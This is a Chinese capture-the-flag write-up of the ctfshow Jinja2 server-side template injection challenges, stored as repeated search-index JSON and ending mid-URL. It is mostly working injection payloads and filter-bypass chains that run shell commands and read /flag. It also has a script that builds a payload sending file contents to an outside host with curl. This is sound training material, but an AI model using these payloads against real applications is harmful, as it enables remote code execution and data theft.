[{"categories":["CTF","web"],"content":"ctfshow ssti漏洞专题 python jinja2 ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入 ","date":"2024-03-10","objectID":"/ctfshow_ssti/:0:0","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#"},{"categories":["CTF","web"],"content":"\r先抄抄笔记","date":"2024-03-10","objectID":"/ctfshow_ssti/:1:0","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#先抄抄笔记"},{"categories":["CTF","web"],"content":"\r代码块 变量块 {{}} 用于将表达式打印到模板输出 注释块 {##} 注释 控制块 {百分号%} 可以声明变量，也可以执行语句 //这个标签会造成GitHub报错，所以用文字替换了 {% for i in ''.__class__.__mro__[1].__subclasses__() %}{% if i.__name__=='_wrap_close' %}{百分号 print i.__init__.__globals__['popen']('ls').read() %}{% endif %}{% endfor %} 行声明 ## 可以有和{百分号%}相同的效果 ","date":"2024-03-10","objectID":"/ctfshow_ssti/:1:1","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#代码块"},{"categories":["CTF","web"],"content":"\r常用方法 python的str(字符串)、dict(字典)、tuple(元组)、list(列表)这些在Python类结构的基类都是object，而object拥有众多的子类。 [].__class__：列表 ''.__class__ ：字符串 ().__class__ ：元组 {}.__class__：字典 ------------------------------------------------------------ 有这些类继承的方法，我们就可以从任何一个变量，回溯到最顶层基类（\u003cclass'object'\u003e）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。 __class__ ：类的一个内置属性，查看实例对象的类。 __base__ ：类型对象的直接基类 __bases__ ：类型对象的全部基类（直接父类），以元组形式（只有一个元素），类型的实例通常没有属性 __bases__ __mro__ ：可以用来获取一个类的调用顺序，元组形式，返回如(\u003cclass 'str'\u003e, \u003cclass 'object'\u003e)。__mro__[1]就是object ------------------------------------------------------------ __subclasses__()：返回这个类的所有子类，列表形式。 __builtins__：内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。返回内建内建名称空间字典__builtins__与__builtin__的区别就不放了，百度都有。 （做为默认初始模块出现的，可用于查看当前所有导入的内建函数。，集合形式） __init__：初始化类，返回的类型是function，可以用来跳到__globals__。 __globals__：会以字典的形式返回当前位置的所有全局变量，与 func_globals 等价。 __import__：动态加载类和函数，也就是导入模块，经常用于导入os模块，语法：__import__(模块名)。如：__import__('os').popen('ls').read() ------------------------------------------------------------ __dic__ ：类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里 __getattribute__()：实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。 __getitem__()：调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b') ","date":"2024-03-10","objectID":"/ctfshow_ssti/:1:2","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#常用方法"},{"categories":["CTF","web"],"content":"\rSSTI-jinja2执行命令 内建函数 eval 执行命令 os 模块执行命令 popen 函数执行命令 importlib 类执行命令 linecache 函数执行命令 subprocess.Popen 类执行命令 ","date":"2024-03-10","objectID":"/ctfshow_ssti/:1:3","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#ssti-jinja2执行命令"},{"categories":["CTF","web"],"content":"\r一般注入流程在检测到存在SSTI模板注入漏洞之后-\u003e获得内置类所对应的类-\u003e获得object基类-\u003e获得所有子类-\u003e获得可以执行shell命令的子类-\u003e找到该子类可以执行shell命令的方法-\u003e执行shell命令 ","date":"2024-03-10","objectID":"/ctfshow_ssti/:1:4","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#一般注入流程"},{"categories":["CTF","web"],"content":"\r靶场题目","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:0","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#靶场题目"},{"categories":["CTF","web"],"content":"\r[web361]无过滤 http://ce35ed03-e23c-4193-91c5-a9cec7d03e26.challenge.ctf.show/?name={{7*7}} 回显49，存在ssti注入漏洞 获得内置类所对应的类 http://ce35ed03-e23c-4193-91c5-a9cec7d03e26.challenge.ctf.show/?name={{''.__class__}} 获得object基类 http://ce35ed03-e23c-4193-91c5-a9cec7d03e26.challenge.ctf.show/?name={{''.__class__.__base__}} 获得所有子类 http://ce35ed03-e23c-4193-91c5-a9cec7d03e26.challenge.ctf.show/?name={{''.__class__.__base__.__subclasses__()}} 通过python脚本判断可以执行shell命令子类的索引值 以子类是否存在popen方法为例： import requests for num in range(500): try: url = \"http://53e07393-3341-47a7-b048-e4773c51a22c.challenge.ctf.show/?name={{''.__class__.__base__.__subclasses__()[\"+str(num)+\"].__init__.__globals__['popen']}}\" res = requests.get(url=url).text if 'popen' in res: print(num) except: pass 执行shell命令 http://53e07393-3341-47a7-b048-e4773c51a22c.challenge.ctf.show/?name={{''.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('ls /').read()}} 读取flag文件 ","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:1","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web361无过滤"},{"categories":["CTF","web"],"content":"\r[web362]过滤数字开始过滤数字，写个python脚本测试一下哪些数字没被过滤 import requests for i in range(10): url = \"http://e789961f-7694-423c-a72f-d00e630f15b3.challenge.ctf.show/?name=\"+str(i) res = requests.get(url=url).text if \":(\" not in res: print(i) 可以用全角数字进行绕过 ‘０’,‘１’,‘２’,‘３’,‘４’,‘５’,‘６’,‘７’,‘８’,‘９’ payload: //根据上题序列，替换为全角数字 ?name={{\"\".__class__.__bases__[０].__subclasses__()[１３２].__init__.__globals__['popen']('cat /flag').read()}} 以下payload是抄的，暂时抄一下 ?name={{a.__init__.__globals__['__builtins__'].eval('__import__(\"os\").popen(\"cat /flag\").read()')}} ?name={{''.__class__.__bases__[0].__subclasses__()[１３２].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"cat /flag\").read()')}} ?name={{ config.__class__.__init__.__globals__['os'].popen('cat ../flag').read() }} ","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:2","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web362过滤数字"},{"categories":["CTF","web"],"content":"\r[web363]过滤单双引号request.args.a绕过 payload： //request绕过 ?name={{ config.__class__.__init__.__globals__[request.args.a].popen(request.args.b).read() }}\u0026a=os\u0026b=cat ../flag //chr字符串拼接 ?name={{x.__init__.__globals__[request.args.a].eval(request.args.b)}}\u0026a=__builtins__\u0026b=__import__('os').popen('cat /flag').read() ","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:3","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web363过滤单双引号"},{"categories":["CTF","web"],"content":"\r[web364]过滤args用其他方式传参 payload: ?name={{x.__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)}} Cookie传参:x1=__builtins__;x2=__import__('os').popen('cat /flag').read() 发包： GET /?name={{x.__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)}} HTTP/1.1 Host: 21384bce-894b-46a7-9265-8b1cba126448.challenge.ctf.show Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Cookie: x1=__builtins__;x2=__import__('os').popen('cat /flag').read() User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Connection: close ","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:4","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web364过滤args"},{"categories":["CTF","web"],"content":"\r[web365]过滤’’、\"\"、[、args跑fuzzy字典，发现四个过滤： //ssti-fuzz.txt . [ ] _ { } {{ }} {百分号 %} {%if {%endif {%print( 1 2 3 4 5 6 7 8 9 0 ' \" + %2B %2b join() u os popen importlib linecache subprocess |attr() request args value cookie __getitem__() __class__ __base__ __bases__ __mro__ __subclasses__() __builtins__ __init__ __globals__ __import__ __dic__ __getattribute__() __getitem__() __str__() lipsum current_app 过滤了四个字符''、\"\"、[、args 测os模块在哪 {{x.__class__.__bases__.__getitem__(0).__subclasses__()}} 原始payload： {{''.__class__.__bases__.__getitem__(0).__subclasses__()[132].__init__.__globals__.popen('ls /').read()}} __getitem__绕过中括号[过滤： {{x.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen('ls /').read()}} request对象绕过引号''、\"\"过滤，cookie绕过args过滤 {{x.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen(request.cookies.x).read()}} Cookie传参：x=ls / 成功进行命令执行后，改cookie传参： x=cat /flag ","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:5","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web365过滤args"},{"categories":["CTF","web"],"content":"\r[web366]过滤’’、\"\"、[、args、_\r在web366 payload基础上，进行_绕过 {{x.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen(request.cookies.x).read()}} |attr()+request对象绕过对下划线的过滤 \"\"|attr(\"__class__\") 相当于 \"\".__class__ {{x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3)(0)|attr(request.cookies.x4)()|attr(request.cookies.x5)(132)|attr(request.cookies.x6)|attr(request.cookies.x7).popen(request.cookies.x8).read()}} Cookie传参： x1=__class__;x2=__bases__;x3=__getitem__;x4=__subclasses__;x5=__getitem__;x6=__init__;x7=__globals__;x8=tac /f* 没通…… ","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:6","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web366过滤args_"},{"categories":["CTF","web"],"content":"\r[web367]过滤’’、\"\"、[、args、_、os通过cookie传os {{(lipsum|attr(request.cookies.x1)).get(request.cookies.x2).popen(request.cookies.x3).read()}} Cookie传参：x1= __globals__;x2=os;x3=tac /flag ","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:7","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web367过滤args_os"},{"categories":["CTF","web"],"content":"\r[web368]过滤’’、\"\"、[、args、_、os、{{通过{百分号print(......)%}替代{{...}}来绕过对{花括号的过滤 {百分号print(lipsum|attr(request.cookies.x1)).get(request.cookies.x2).popen(request.cookies.x3).read()%} Cookie传参：x1= __globals__;x2=os;x3=tac /flag 也可以用{%set来绕过 {%set aaa=(lipsum|attr(request.cookies.x1)).get(request.cookies.x2).popen(request.cookies.x3).read()%}{% print(aaa)%} Cookie传参：x1= __globals__;x2=os;x3=tac /flag ","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:8","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web368过滤args_os"},{"categories":["CTF","web"],"content":"\r[web369]过滤’’、\"\"、[、args、_、os、{{、request抄了以下payload： payload1：读取/flag文件： ?name= {% set po=dict(po=1,p=2)|join%} {% set a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} 详解： //构造pop {% set po=dict(po=1,p=2)|join%} //构造下划线 _ {% set a=(()|select|string|list)|attr(po)(24)%} //构造request {% set re=dict(reque=1,st=1)|join%} //构造__init__ {% set in=(a~a~dict(init=a)|join~a~a)|join()%} //构造__globals__ {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} //构造__getitem__ {% set ge=(a~a~dict(getitem=a)|join~a~a)%} //构造__builtins__ {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} //【构造】q.__init__.__globals__.__getitem__.__builtins__ {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} //构造chr函数 {% set chr=x.chr%} // 构造/flag {% set f=chr(47)~(dict(flag=a)|join)%} //读取文件/flag {% print(x.open(f).read())%} payload2：执行命令cat /flag相当于lipsum.__globals__['__builtins__'].open('/flag').read() ?name={% print (lipsum|attr( (config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower() )) .get( (config|string|list).pop(2).lower()~(config|string|list).pop(42).lower() ) .popen( (config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower() ).read() %} payload3：执行命令cat /flag //构造下划线_ ?name={%set%20xiahua=(lipsum|select|string|list).pop(24)%} {%set gb=(xiahua,xiahua,dict(glo=a,bals=a)|join,xiahua,xiahua)|join%} {%set gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%} {%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%} {%set chcr=(lipsum|attr(gb)|attr(gm)(bl)).chr%} {%set oo=dict(o=a,s=a)|join%} {%set pp=dict(po=a,pen=a)|join%} {%set space=chcr(32)%} {%set xiegang=chcr(47)%} {%set f1ag=dict(fl=a,ag=a)|join%} {%set shell=(dict(cat=a)|join,space,xiegang,f1ag)|join%} {%print lipsum|attr(gb)|attr(gm)(oo)|attr(pp)(shell)|attr(dict(re=a,ad=a)|join)()%} ","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:9","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web369过滤args_osrequest"},{"categories":["CTF","web"],"content":"\r[web369]过滤’’、\"\"、[、args、_、os、{{、request抄了以下payload： payload1：读取/flag文件： ?name= {% set po=dict(po=1,p=2)|join%} {% set a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} 详解： //构造pop {% set po=dict(po=1,p=2)|join%} //构造下划线 _ {% set a=(()|select|string|list)|attr(po)(24)%} //构造request {% set re=dict(reque=1,st=1)|join%} //构造__init__ {% set in=(a~a~dict(init=a)|join~a~a)|join()%} //构造__globals__ {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} //构造__getitem__ {% set ge=(a~a~dict(getitem=a)|join~a~a)%} //构造__builtins__ {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} //【构造】q.__init__.__globals__.__getitem__.__builtins__ {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} //构造chr函数 {% set chr=x.chr%} // 构造/flag {% set f=chr(47)~(dict(flag=a)|join)%} //读取文件/flag {% print(x.open(f).read())%} payload2：执行命令cat /flag相当于lipsum.__globals__['__builtins__'].open('/flag').read() ?name={% print (lipsum|attr( (config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower() )) .get( (config|string|list).pop(2).lower()~(config|string|list).pop(42).lower() ) .popen( (config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower() ).read() %} payload3：执行命令cat /flag //构造下划线_ ?name={%set%20xiahua=(lipsum|select|string|list).pop(24)%} {%set gb=(xiahua,xiahua,dict(glo=a,bals=a)|join,xiahua,xiahua)|join%} {%set gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%} {%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%} {%set chcr=(lipsum|attr(gb)|attr(gm)(bl)).chr%} {%set oo=dict(o=a,s=a)|join%} {%set pp=dict(po=a,pen=a)|join%} {%set space=chcr(32)%} {%set xiegang=chcr(47)%} {%set f1ag=dict(fl=a,ag=a)|join%} {%set shell=(dict(cat=a)|join,space,xiegang,f1ag)|join%} {%print lipsum|attr(gb)|attr(gm)(oo)|attr(pp)(shell)|attr(dict(re=a,ad=a)|join)()%} ","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:9","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload1读取flag文件"},{"categories":["CTF","web"],"content":"\r[web369]过滤’’、\"\"、[、args、_、os、{{、request抄了以下payload： payload1：读取/flag文件： ?name= {% set po=dict(po=1,p=2)|join%} {% set a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} 详解： //构造pop {% set po=dict(po=1,p=2)|join%} //构造下划线 _ {% set a=(()|select|string|list)|attr(po)(24)%} //构造request {% set re=dict(reque=1,st=1)|join%} //构造__init__ {% set in=(a~a~dict(init=a)|join~a~a)|join()%} //构造__globals__ {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} //构造__getitem__ {% set ge=(a~a~dict(getitem=a)|join~a~a)%} //构造__builtins__ {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} //【构造】q.__init__.__globals__.__getitem__.__builtins__ {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} //构造chr函数 {% set chr=x.chr%} // 构造/flag {% set f=chr(47)~(dict(flag=a)|join)%} //读取文件/flag {% print(x.open(f).read())%} payload2：执行命令cat /flag相当于lipsum.__globals__['__builtins__'].open('/flag').read() ?name={% print (lipsum|attr( (config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower() )) .get( (config|string|list).pop(2).lower()~(config|string|list).pop(42).lower() ) .popen( (config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower() ).read() %} payload3：执行命令cat /flag //构造下划线_ ?name={%set%20xiahua=(lipsum|select|string|list).pop(24)%} {%set gb=(xiahua,xiahua,dict(glo=a,bals=a)|join,xiahua,xiahua)|join%} {%set gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%} {%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%} {%set chcr=(lipsum|attr(gb)|attr(gm)(bl)).chr%} {%set oo=dict(o=a,s=a)|join%} {%set pp=dict(po=a,pen=a)|join%} {%set space=chcr(32)%} {%set xiegang=chcr(47)%} {%set f1ag=dict(fl=a,ag=a)|join%} {%set shell=(dict(cat=a)|join,space,xiegang,f1ag)|join%} {%print lipsum|attr(gb)|attr(gm)(oo)|attr(pp)(shell)|attr(dict(re=a,ad=a)|join)()%} ","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:9","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload2执行命令cat-flag"},{"categories":["CTF","web"],"content":"\r[web369]过滤’’、\"\"、[、args、_、os、{{、request抄了以下payload： payload1：读取/flag文件： ?name= {% set po=dict(po=1,p=2)|join%} {% set a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} 详解： //构造pop {% set po=dict(po=1,p=2)|join%} //构造下划线 _ {% set a=(()|select|string|list)|attr(po)(24)%} //构造request {% set re=dict(reque=1,st=1)|join%} //构造__init__ {% set in=(a~a~dict(init=a)|join~a~a)|join()%} //构造__globals__ {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} //构造__getitem__ {% set ge=(a~a~dict(getitem=a)|join~a~a)%} //构造__builtins__ {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} //【构造】q.__init__.__globals__.__getitem__.__builtins__ {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} //构造chr函数 {% set chr=x.chr%} // 构造/flag {% set f=chr(47)~(dict(flag=a)|join)%} //读取文件/flag {% print(x.open(f).read())%} payload2：执行命令cat /flag相当于lipsum.__globals__['__builtins__'].open('/flag').read() ?name={% print (lipsum|attr( (config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower() )) .get( (config|string|list).pop(2).lower()~(config|string|list).pop(42).lower() ) .popen( (config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower() ).read() %} payload3：执行命令cat /flag //构造下划线_ ?name={%set%20xiahua=(lipsum|select|string|list).pop(24)%} {%set gb=(xiahua,xiahua,dict(glo=a,bals=a)|join,xiahua,xiahua)|join%} {%set gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%} {%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%} {%set chcr=(lipsum|attr(gb)|attr(gm)(bl)).chr%} {%set oo=dict(o=a,s=a)|join%} {%set pp=dict(po=a,pen=a)|join%} {%set space=chcr(32)%} {%set xiegang=chcr(47)%} {%set f1ag=dict(fl=a,ag=a)|join%} {%set shell=(dict(cat=a)|join,space,xiegang,f1ag)|join%} {%print lipsum|attr(gb)|attr(gm)(oo)|attr(pp)(shell)|attr(dict(re=a,ad=a)|join)()%} ","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:9","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload3执行命令cat-flag"},{"categories":["CTF","web"],"content":"\r[web370]过滤’’、\"\"、[、args、_、os、{{、request、数字以web369的payload进行修改： ?name= {% set po=dict(po=1,p=2)|join%} {% set a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload1：全角数字绕过 '０','１','２','３','４','５','６','７','８','９' 用全角数字替换payload中的半角数字 ?name= {% set po=dict(po=１,p=２)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set re=dict(reque=１,st=１)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(４７)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload2：构造数字 {% set cc=(dict(ee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|length)%} 从而cc=2,cccc=4 再{% set coun=(cc~cccc)|int%} --\u003e coun=24 快速得到一个数值 所以，构造 {% set ershisi=(cc~cccc)|int%} {% set po=dict(po=c,p=c)|join%} {% set a=(()|select|string|list)|attr(po)(ershisi)%} 等效于： {% set a=(()|select|string|list)|pop(24)%} payload： ?name= {% set c=(dict(e=a)|join|count)%} {% set cc=(dict(ee=a)|join|count)%} {% set ccc=(dict(eee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|count)%} {% set ccccccc=(dict(eeeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set twoandfour=(cc~cccc)|int%} {% set fourandseven=(cccc~ccccccc)|int%} {% set po=dict(po=b,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(twoandfour)%} {% set re=dict(reque=b,st=b)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(fourandseven)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload3：index构造数字 ?name= {% set o=(dict(o=z)|join) %} {% set n=dict(n=z)|join %} {% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %} {% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %} {% set xiegang=(config|string|list).pop(-liushisi) %} {% set gang=(()|select|string|list).pop(ershisi) %} {% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %} {% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %} {% set gangfulaige=(xiegang,dict(flag=z)|join)|join %} {% print (lipsum|attr(globals)).get(builtins).open(gangfulaige).read() %} payload4：反弹shell import requests cmd='__import__(\"os\").popen(\"curl http://vps-ip:9023?p=`cat /flag`\").read()' def fun1(s): t=[] for i in range(len(s)): t.append(ord(s[i])) k='' t=list(set(t)) for i in t: k+='{% set '+'e'*(t.index(i)+1)+'=dict('+'e'*i+'=a)|join|count%}\\n' return k def fun2(s): t=[] for i in range(len(s)): t.append(ord(s[i])) t=list(set(t)) k='' for i in range(len(s)): if i\u003clen(s)-1: k+='chr('+'e'*(t.index(ord(s[i]))+1)+')%2b' else: k+='chr('+'e'*(t.index(ord(s[i]))+1)+')' return k url ='http://fc5ded74-98ba-4d98-a6f9-47ab2616ba41.challenge.ctf.show/?name='+fun1(cmd)+''' {% set coun=dict(eeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%} {% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(coun)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%} {% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%} {% set built=(a,a,dict(builtins=a)|join,a,a)|join()%} {% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%} {% set chr=x.chr%} {% set cmd='''+fun2(cmd)+''' %} {%if x.eval(cmd)%} abc {%endif%} ''' print(url) 执行脚本得到payload： http://2904f8f4-2f8","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:10","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web370过滤args_osrequest数字"},{"categories":["CTF","web"],"content":"\r[web370]过滤’’、\"\"、[、args、_、os、{{、request、数字以web369的payload进行修改： ?name= {% set po=dict(po=1,p=2)|join%} {% set 